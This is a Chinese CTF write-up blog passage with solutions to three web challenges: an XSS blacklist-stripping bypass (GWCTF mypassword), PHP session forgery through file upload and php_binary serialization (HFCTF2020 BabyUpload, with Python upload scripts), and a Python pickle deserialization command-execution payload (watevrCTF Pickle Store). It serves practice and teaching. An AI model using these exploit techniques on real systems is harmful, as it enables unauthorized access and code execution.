<p>大致就是利用<code>cookie</code>传递用户名和密码：</p>
<p>![GWCTF 2019mypassword2](img&#x2F;GWCTF 2019mypassword2.png)</p>
<p>存在<code>register.php</code>，随便注册一个登录：</p>
<p>![GWCTF 2019mypassword1](img&#x2F;GWCTF 2019mypassword1.png)</p>
<p>环境有问题。。这个页面应该还有<code>feedback,list,logout</code>这些功能但我重启了好几次还是这吊样，吗的。</p>
<p><code>feedback.php</code>右键存在注释：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$feedback</span>))&#123;<br>				<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;反馈不合法&#x27;);&lt;/script&gt;&quot;</span>;<br>				<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>			&#125;<br>			<span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;input&#x27;</span>,<span class="hljs-string">&#x27;script&#x27;</span>,<span class="hljs-string">&#x27;iframe&#x27;</span>,<span class="hljs-string">&#x27;host&#x27;</span>,<span class="hljs-string">&#x27;onload&#x27;</span>,<span class="hljs-string">&#x27;onerror&#x27;</span>,<span class="hljs-string">&#x27;srcdoc&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>,<span class="hljs-string">&#x27;svg&#x27;</span>,<span class="hljs-string">&#x27;form&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>,<span class="hljs-string">&#x27;src&#x27;</span>,<span class="hljs-string">&#x27;getElement&#x27;</span>,<span class="hljs-string">&#x27;document&#x27;</span>,<span class="hljs-string">&#x27;cookie&#x27;</span>];<br>			<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$val</span>) &#123;<br>		        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>		            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$feedback</span>,<span class="hljs-variable">$val</span>) !== <span class="hljs-literal">false</span>)&#123;<br>		                <span class="hljs-variable">$feedback</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$val</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$feedback</span>);<br>		            &#125;<span class="hljs-keyword">else</span>&#123;<br>		                <span class="hljs-keyword">break</span>;<br>		            &#125;<br>		        &#125;<br>		    &#125;<br></code></pre></td></tr></table></figure>

<p>简单替换过滤，直接把关键字替换成空了。<code>foreach</code>函数会遍历每个关键字，然后如果语句中存在对应关键字就换成空。比如可以通过构造<code>scriphostt</code>这种来构造我们需要的<code>payload</code>。</p>
<p>这里我看有些师傅说<code>cookie</code>放在最后了所以不能通过构造<code>coocookiekie</code>这种去拼。。不知道为啥：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$feedback</span> = <span class="hljs-string">&#x27;coocookiekie&#x27;</span>;<br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;input&#x27;</span>,<span class="hljs-string">&#x27;script&#x27;</span>,<span class="hljs-string">&#x27;iframe&#x27;</span>,<span class="hljs-string">&#x27;host&#x27;</span>,<span class="hljs-string">&#x27;onload&#x27;</span>,<span class="hljs-string">&#x27;onerror&#x27;</span>,<span class="hljs-string">&#x27;srcdoc&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>,<span class="hljs-string">&#x27;svg&#x27;</span>,<span class="hljs-string">&#x27;form&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>,<span class="hljs-string">&#x27;src&#x27;</span>,<span class="hljs-string">&#x27;getElement&#x27;</span>,<span class="hljs-string">&#x27;document&#x27;</span>,<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$val</span>) &#123;<br>    <span class="hljs-variable">$feedback</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$val</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$feedback</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$feedback</span>; <span class="hljs-comment">// 输出：&#x27;cookie&#x27;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>2024.1.12 这题环境有问题做不了，直接看<code>wp</code>的话和没做一样，留着后面看看能不能做吧</strong></p>
<h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">&quot;/var/babyctf/&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;/flag&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/var/babyctf/success.txt&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-title function_ invoke__">safe_delete</span>(<span class="hljs-variable">$filename</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] =<span class="hljs-string">&#x27;guest&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$direction</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;direction&#x27;</span>); <span class="hljs-comment">#filter_input函数用于获取post传递的对应参数的值</span><br><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;attr&#x27;</span>);<br><span class="hljs-variable">$dir_path</span> = <span class="hljs-string">&quot;/var/babyctf/&quot;</span>.<span class="hljs-variable">$attr</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$attr</span>===<span class="hljs-string">&quot;private&quot;</span>)&#123;<br>    <span class="hljs-variable">$dir_path</span> .= <span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-comment">#在dir_path后追加/会话用户名，/var/babyctf/private/$_SESSION[&#x27;username&#x27;]</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$direction</span> === <span class="hljs-string">&quot;upload&quot;</span>)&#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;invalid upload&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_path</span> .= <span class="hljs-string">&quot;_&quot;</span>.<span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&quot;sha256&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;invalid file path&#x27;</span>);<br>        &#125;<br>        @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir_path</span>, <span class="hljs-number">0700</span>, <span class="hljs-literal">TRUE</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-variable">$upload_result</span> = <span class="hljs-string">&quot;uploaded&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;error while saving&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">RuntimeException</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$upload_result</span> = <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br> <span class="hljs-comment">//上面部分为上传功能，下面部分包括下载功能</span><br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$direction</span> === <span class="hljs-string">&quot;download&quot;</span>) &#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;filename&#x27;</span>));<br>        <span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;invalid file path&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file_path</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;file not exist&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/force-download&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span>.<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file_path</span>));<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">65</span>).<span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file_path</span>))&#123;<br>            <span class="hljs-variable">$download_result</span> = <span class="hljs-string">&quot;downloaded&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&#x27;error while saving&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">RuntimeException</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-variable">$download_result</span> = <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>文件上传+文件下载功能，通过<code>POST</code>传递三个参数：<code>direction</code>，<code>attr</code>，<code>filename</code>(第三个参数只有文件下载的时候才能用到)。<code>direction</code>这东西就是用来表示功能的：<code>upload</code>或者<code>download</code>功能。<code>attr</code>和文件路径有关系：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$attr</span>===<span class="hljs-string">&quot;private&quot;</span>)&#123;<br>    <span class="hljs-variable">$dir_path</span> .= <span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-comment">#在dir_path后追加/会话用户名</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>目测可以用这个去看<code>username</code>字段是多少</p>
<p><code>filename</code>就是下载文件时的用户名。不过下载文件时ban了<code>../</code>和<code>..\</code>，感觉不能目录穿越下载任意文件了。。</p>
<p>看下如何获取<code>flag</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>&#123;<br>    <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/var/babyctf/success.txt&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-title function_ invoke__">safe_delete</span>(<span class="hljs-variable">$filename</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] =<span class="hljs-string">&#x27;guest&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>目测要通过<code>session</code>伪造<code>admin</code>用户然后上传<code>success.txt</code>到目标路径下。但这里有两个问题：</p>
<p>1.$_SESSION[‘username’] &#x3D;&#x3D;&#x3D;’admin’怎么满足</p>
<p>2.&#x2F;var&#x2F;babyctf&#x2F;success.txt这东西如何上传。</p>
<p>先尝试下载<code>session</code>文件：</p>
<blockquote>
<p>php的session默认存储文件名是sess_+PHPSESSID的值</p>
</blockquote>
<p>然后：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">&quot;/var/babyctf/&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br></code></pre></td></tr></table></figure>

<p>我们把<code>attr</code>置空，然后直接<code>direction=download</code>转到文件下载，<code>filename=sess_7d764e03dc4cc7fff5efc9efb063f9b8</code>下载对应文件看看是否能成功：</p>
<p><img src="/img/1HFCTF2020BabyUpload.png" srcset="/img/loading.gif" lazyload alt="1HFCTF2020BabyUpload"></p>
<p>然后是一些在<code>php</code>中<code>session</code>反序列化的一些知识：</p>
<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">参考资料</a></p>
<blockquote>
<p>session中的内容并不是放在内存中的，而是默认以文件的方式来存储的，可由配置项session.save_handler来进行确定。存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。</p>
</blockquote>
<p>主要注意这个<code>php_binary</code>引擎：</p>
<blockquote>
<p>php_binary引擎:键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</p>
</blockquote>
<p>先生成目标<code>session</code>文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_binary&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">&quot;D:\\phpstudy_pro\\WWW\\localhost&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p><img src="/img/2HFCTF2020BabyUpload.png" srcset="/img/loading.gif" lazyload alt="2HFCTF2020BabyUpload"></p>
<p>有了目标文件然后就要上传它，注意这段：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$file_path</span> .= <span class="hljs-string">&quot;_&quot;</span>.<span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&quot;sha256&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p>会把文件名进行拼接处理：<code>名字_文件内容经过sha256加密的值</code>，这正好是<code>session</code>文件的格式。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>,<span class="hljs-string">&#x27;./localhost/sess&#x27;</span>);<br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span><br></code></pre></td></tr></table></figure>

<p>第一个问题解决，第二个问题：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/var/babyctf/success.txt&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br></code></pre></td></tr></table></figure>

<p><code>file_exists</code>函数不关心目标是文件还是目录，只要有这么个路径就能返回<code>true</code>，所以我们直接创建一个目标路径就行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;attr&#x27;</span>);<br><span class="hljs-variable">$dir_path</span> = <span class="hljs-string">&quot;/var/babyctf/&quot;</span>.<span class="hljs-variable">$attr</span>;<br><span class="hljs-comment">//attr=success.txt，后面再带啥我们根本不关心</span><br></code></pre></td></tr></table></figure>

<p>综上：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://8af25a00-06de-4d4b-8452-fadcf1fb7598.node5.buuoj.cn:81/&quot;</span><br>data=&#123;<br>    <span class="hljs-string">&quot;direction&quot;</span>:<span class="hljs-string">&quot;upload&quot;</span>,<br>    <span class="hljs-string">&quot;attr&quot;</span>:<span class="hljs-string">&quot;success.txt&quot;</span><br>&#125;<br>file=&#123;<br>    <span class="hljs-string">&#x27;up_file&#x27;</span>:(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>      &#125;<br>r=requests.post(url=url,files=file,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p>然后：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://8af25a00-06de-4d4b-8452-fadcf1fb7598.node5.buuoj.cn:81/&quot;</span><br>data=&#123;<br>    <span class="hljs-string">&quot;direction&quot;</span>:<span class="hljs-string">&quot;upload&quot;</span><br>&#125;<br>file=&#123;<br>    <span class="hljs-string">&#x27;up_file&#x27;</span>:(<span class="hljs-string">&quot;sess&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sess&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read())<br>&#125;<br>r=requests.post(url=url,files=file,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p>然后抓包把<code>session</code>字段直接改成之前hash的结果就行</p>
<h4 id="思路总结-1"><a href="#思路总结-1" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>post</code>文件上传。<code>session</code>有什么特性？<code>session</code>文件？和<code>PHPSESSID</code>有什么关系？<code>sess_xxxx</code>？<code>php</code>中<code>session</code>的反序列化机制？<code>python</code>写上传文件表单？<code>file</code>?</p>
<h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>商店类型题目</p>
<p><img src="/img/whatevrctfpicklestory1.png" srcset="/img/loading.gif" lazyload alt="whatevrctfpicklestory1"></p>
<p>抓包看看：</p>
<p><img src="/img/whatevrctfpicklestory2.png" srcset="/img/loading.gif" lazyload alt="whatevrctfpicklestory2"></p>
<p><code>base64</code>解码：</p>
<p><img src="/img/whatevrctfpicklestory3.png" srcset="/img/loading.gif" lazyload alt="whatevrctfpicklestory3"></p>
<p>有乱码，不过大致能看出来存有<code>money</code>，购买的物品和用户身份码？</p>
<p>经过<code>pickle</code>序列化的数据通常是二进制格式，再普通文本编辑器中不可读：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><br>enc = <span class="hljs-string">&quot;gAN9cQAoWAUAAABtb25leXEBTXwBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBVgVAAAAWXVtbXkgc3RhbmRhcmQgcGlja2xlcQZlWBAAAABhbnRpX3RhbXBlcl9obWFjcQdYIAAAADgwNzUzODY5ZmEzODNlOGFjNWQ2YWJhM2FiYWU3ZGMzcQh1Lg==&quot;</span><br><br><span class="hljs-built_in">print</span>(pickle.loads(b64decode(enc)))<br><span class="hljs-comment">#运行后回显:&#123;&#x27;money&#x27;: 380, &#x27;history&#x27;: [&#x27;Yummy smörgåsgurka&#x27;, &#x27;Yummy standard pickle&#x27;, &#x27;Yummy standard pickle&#x27;], &#x27;anti_tamper_hmac&#x27;: &#x27;80753869fa383e8ac5d6aba3abae7dc3&#x27;&#125;</span><br><br></code></pre></td></tr></table></figure>

<p>注意最后那个字段：<code>anti_tamper_hmac</code></p>
<p><img src="/img/picksroryyyyy1.png" srcset="/img/loading.gif" lazyload alt="picksroryyyyy1"></p>
<p>所以这里直接修改<code>money</code>等字段是不现实的，不过既然已经知道<code>session</code>字段会被反序列化，那就直接让他执行命令就好了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> commands<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">errorr0</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>		<span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&quot;ls /&quot;</span>,))<br> <br>a = errorr0()<br>b = pickle.dumps(a)<br>c = base64.b64encode(b)<br><span class="hljs-built_in">print</span> c<br><span class="hljs-comment">#参考：https://blog.csdn.net/qq_51295677</span><br></code></pre></td></tr></table></figure>



